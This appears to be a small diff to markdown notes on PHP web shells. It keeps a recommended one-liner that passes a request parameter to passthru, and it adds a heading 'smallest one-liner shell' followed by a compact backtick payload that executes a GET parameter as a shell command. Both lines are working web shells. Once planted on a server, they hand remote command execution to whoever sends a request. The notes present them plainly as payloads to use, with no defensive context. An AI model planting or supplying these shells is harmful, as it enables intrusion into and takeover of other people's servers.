@@ -28,8 +28,11 @@ For basic features, I recommend one-liners like :
 
 `<?php passthru($_REQUEST['cmd']); ?>`
 
-
-
+smallest one-liner shell:
+===
+```
+<?=`$_GET[C]`?>
+```
 
 Cite:
 =====
